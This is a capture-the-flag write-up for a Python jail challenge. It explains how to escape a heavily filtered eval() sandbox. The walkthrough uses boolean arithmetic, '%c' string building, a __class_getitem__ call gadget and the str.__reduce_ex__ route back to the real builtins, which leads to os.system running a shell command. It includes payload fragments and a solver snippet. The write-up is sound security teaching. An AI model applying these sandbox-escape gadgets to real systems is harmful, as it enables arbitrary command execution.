# jailincpython

**Category:** Misc | **Difficulty:** Medium | **Points:** 210 | **Flag:** `pwnsec{91d28e3ae6e7654a}`

## Challenge Description

> Some say this jail is impossible. Everything useful is banned.
>
> **- @Muhammed**

We're handed a tiny Python service (`main.py`) that drops our input straight into `eval()` — but only after running it through a brutal filter. The attachment came as `jailincpython.zip` (archive password: `infected`).

## Initial Analysis

The whole challenge fits in a few lines. Here's the heart of `main.py`:

```python
pattern = re.compile(
    r'^(?:[^\[\]"\'0-9()]+|\[[^\[\]"\'0-9()]*\])*$'
)

class hint_A():
    ...

hint_B = "%jailincpython"

user_input = input("~ ")
if (not bool(pattern.fullmatch(user_input))
    or user_input.count('.') > 2
    or not user_input.isascii()
    or len(user_input) > 800):
    print("Nope!!")
    exit()

print(eval(user_input, {'globals': {}, '__builtins__': {"hint_A": hint_A, "hint_B": hint_B}}, {}))
```

So what's actually banned? Reading the regex and the extra checks:

- **No quotes** (`'` or `"`) — can't write string literals.
- **No digits** `0-9` — can't type numbers.
- **No parentheses** `(` `)` — can't make ordinary function calls.
- **No nested square brackets** — `[` can't contain another `[`.
- **At most two `.` characters** in the whole payload.
- **Max 800 characters**, ASCII only.
- `__builtins__` is replaced by a dict that only contains `hint_A` (an empty class) and `hint_B` (a weird string).

At first glance it really does look impossible. But notice two "gifts" the author left us:

- `hint_B = "%jailincpython"` — the leading `%` is suspicious. That's the old-style `printf`-formatting marker.
- `globals` is passed in as an **empty dict**, not the real `globals()` function. It becomes free mutable storage we can abuse.

## The Vulnerability / Core Concept

`eval()` only evaluates a single *expression*, and the filter kills the obvious tools — but Python has a surprising amount of hidden machinery that survives the filter. The escape combines four tricks:

1. **Numbers from booleans.** `True == 1` and `False == 0`, so arithmetic on them (plus shifts like `b << f-a`) builds any integer without a digit. The payload even uses `-~v` (= `v+1`) and `~-v` (= `v-1`) as compact increment/decrement.

2. **Strings from `%c`.** Slicing `hint_B[::f]` (with `f == 7`) picks characters 0 and 7 of `"%jailincpython"`, yielding `"%c"`. Then `"%c" % 47` gives `/`, `% 46` gives `.`, and so on. That rebuilds every character needed to spell names like `__reduce_ex__`, `__builtins__`, `__import__`, `system`, and the command `od /*.*` — all without ever typing a quote.

3. **Subscription as a function call.** This is the key move. A class responds to `Class[x]` via its `__class_getitem__` slot. We can't write `Class.__class_getitem__(x)` (parens!), but we *can* install a callable into that slot using a comprehension target:
   ```python
   for hint_A.__class_getitem__ in {some_callable}
   ```
   After that, `hint_A[value]` is literally `some_callable(value)` — a parenthesis-free call gadget we can re-arm as many times as we like.

4. **Escaping to the real builtins via `__reduce_ex__`.** The sandbox's `__builtins__` is nearly empty, but `hint_B.__reduce_ex__(2)[0]` returns a normal Python helper function (`copyreg.__newobj__`), and *that* function carries a `__builtins__` attribute pointing at the real, full builtins dict. From there we grab `__import__`, import `os`, fetch `os.system`, and run a shell command.

The two precious dots are spent carefully: one on a generic `lambda j: j.__getattribute__` attribute-getter (so every other attribute can be looked up dynamically by a string we built), and one on the assignment target `hint_A.__class_getitem__`.

## Exploitation

The full generated expression lives in [`payload.txt`](payload.txt) (795 chars, exactly two dots, passes the regex). It has three comma-joined parts:

**Part 1 — build the toolkit.** A big `{...}` set of walrus assignments (`:=`) that create the numbers, the `%c` formatter, every needed character, and the dynamic strings:

```python
t:=True, F:=False, a:=t+t, b:=a+t, c:=a+a, f:=b+c, g:=c+c,   # small ints
v:=b<<f-a, v:=v-t,                                           # 95
M:=hint_B[::f],                                              # "%c"
H:=M%n, J:=M%n, ...,                                         # '/', '.', '*', ' ', '_', letters
x:=U*a+R+E+D+W+hint_B[f]+E+U+E+M%v+U*a,                       # "__reduce_ex__"
y:=U*a+B+W+I+hint_B[c]+T+I+hint_B[-t]+S+U*a,                  # "__builtins__"
o:=U*a+I+K+hint_B[g]+O+R+T+U*a,                              # "__import__"
w:=S+hint_B[~c]+S+T+E+K                                       # "system"
```

**Part 2 — seed the call gadget.** A comprehension that stores a generic getter lambda into `globals` for each key, priming our little state table:

```python
{i:=~F for p in {lambda j:j.__getattribute__} for q in hint_B[:g+a]
        for globals[q] in {p} if [j:=p]}
```

**Part 3 — the nine-stage call chain.** The outer comprehension iterates `globals`, and on each pass swaps `hint_A.__class_getitem__` for the next callable, driving this state machine:

| Stage | Callable in `hint_A` | Argument | Result |
|------:|----------------------|----------|--------|
| 0 | generic getter | `hint_B` | `hint_B.__getattribute__` |
| 1 | string getter | `"__reduce_ex__"` | bound reduce method |
| 2 | reduce method | `2` | reduction tuple |
| 3 | generic getter | tuple[0] | helper's getter |
| 4 | helper getter | `"__builtins__"` → `"__import__"` | real `__import__` |
| 5 | `__import__` | `"os"` | the `os` module |
| 6 | generic getter | `os` module | module getter |
| 7 | module getter | `"system"` | `os.system` |
| 8 | `os.system` | `"od /*.*"` | command runs |

Two neat details make this fit in one expression: lambda **default values** are evaluated at lambda-creation time (used purely for side effects), and dict **values** can be reassigned while iterating its keys as long as the size never changes.

The flag is stored in a randomly-named dotted file under `/`, so the shell glob `/*.*` finds it, and `od` dumps it as little-endian octal words. The solver, [`solve.py`](solve.py), connects over TLS, sends the payload, prints the `od` output, and reconstructs the bytes:

```python
words = re.findall(rb'(?m)^\d{7}((?: [0-7]{6})+)$', out)
raw = b''.join(struct.pack('<H', int(w, 8)) for line in words for w in line.split())
match = re.search(rb'pwnsec\{[^}\n]+\}', raw)
```

Run it against the live instance:

```sh
python3 solve.py CHALLENGE_HOST
```

The returned `od` dump was:

```text
0000000 073560 071556 061545 034573 062061 034062 031545 062541
0000020 062466 033067 032065 076541 000012
0000031
```

which decodes straight to the flag.

## Flag

```
pwnsec{91d28e3ae6e7654a}
```

## Key Takeaways

- A pyjail is never "impossible" — the right question is *"which legal syntax still performs hidden operations?"* not *"how do I type `open('/flag')`?"*.
- Reusable gadgets: `True`/`False` → numbers, `%c` → arbitrary characters, `__class_getitem__` → parenthesis-free calls, `for x in {...}` → assignment, lambda defaults → side effects.
- `str.__reduce_ex__(2)[0].__builtins__` is a classic bridge from a stripped `__builtins__` back to the real one.
- Odd-looking constants handed to you (like `"%jailincpython"`) are usually hints — here it hid both the `%c` formatter and useful letters.
